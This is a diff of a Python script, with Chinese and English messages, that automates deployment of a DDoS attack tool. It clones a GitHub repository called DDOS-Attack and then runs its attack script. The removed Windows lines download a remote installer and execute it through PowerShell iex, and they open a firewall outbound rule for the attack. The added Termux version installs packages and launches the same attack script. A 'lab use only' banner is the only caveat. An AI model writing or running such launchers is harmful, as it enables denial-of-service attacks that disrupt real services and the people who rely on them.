@@ -2,58 +2,42 @@ import subprocess
 import sys
 import os
 
-def run_cmd(command, shell=True):
-    """运行命令并实时输出"""
+def run_cmd(command):
     print(f"[CMD] {command}")
-    process = subprocess.Popen(command, shell=shell, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-    for line in process.stdout:
-        print(line, end='')
-    process.wait()
-    return process.returncode
+    result = subprocess.run(command, shell=True, text=True)
+    return result.returncode
 
 def main():
-    print("=" * 60)
-    print("  DDOS-Attack 自动部署脚本 (Python)")
-    print("  警告：仅限在隔离实验室环境中使用！")
-    print("=" * 60)
-    input("按 Enter 继续，或 Ctrl+C 退出...")
+    print("=" * 40)
+    print(" DDOS-Attack Setup (Termux)")
+    print(" WARNING: Lab use only!")
+    print("=" * 40)
+    input("Press Enter to continue...")
 
-    # 1. 检查 Python 版本
-    print("[*] 检查 Python 版本...")
+    # 检查 Python 版本
     if sys.version_info < (3, 6):
-        print("[!] 需要 Python 3.6 或更高版本。")
+        print("[!] Need Python 3.6+")
         sys.exit(1)
-    print(f"[*] Python {sys.version} 已就绪。")
+    print(f"[*] Python {sys.version} ready.")
 
-    # 2. 安装 Git (如果未安装)
-    print("[*] 尝试安装 Git...")
-    run_cmd("winget install Git.Git --accept-source-agreements --accept-package-agreements")
+    # 安装 git 和 figlet (使用 pkg)
+    print("[*] Installing git and figlet...")
+    run_cmd("pkg install git figlet -y")
 
-    # 3. 安装 Chocolatey (如果未安装)
-    print("[*] 安装 Chocolatey 包管理器...")
-    run_cmd('powershell -NoProfile -ExecutionPolicy Bypass -Command "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString(\'https://community.chocolatey.org/install.ps1\'))"')
-
-    # 4. 安装 figlet
-    print("[*] 安装 figlet...")
-    run_cmd("choco install figlet -y")
-
-    # 5. 克隆仓库
-    print("[*] 克隆 DDOS-Attack 仓库...")
+    # 克隆仓库
     if not os.path.exists("DDOS-Attack"):
+        print("[*] Cloning repository...")
         run_cmd("git clone https://github.com/BC-809/DDOS-Attack.git")
     else:
-        print("[*] 目录已存在，跳过克隆。")
+        print("[*] Repo already exists, pulling latest...")
+        os.chdir("DDOS-Attack")
+        run_cmd("git pull")
+        os.chdir("..")
+
     os.chdir("DDOS-Attack")
 
-    # 6. 添加防火墙规则
-    print("[*] 添加防火墙出站规则...")
-    python_exe = sys.executable
-    run_cmd(f'netsh advfirewall firewall add rule name="Python DDoS Test" dir=out action=allow program="{python_exe}" enable=yes')
-
-    # 7. 运行攻击脚本
-    print("\n" + "=" * 60)
-    print("  部署完成，即将启动 DDOS-Attack 脚本...")
-    print("=" * 60)
+    # 运行攻击脚本（英文版 01）
+    print("[*] Starting attack script...")
     run_cmd("python DDOS/English/DDOS-Attack_01_e.py")
 
 if __name__ == "__main__":
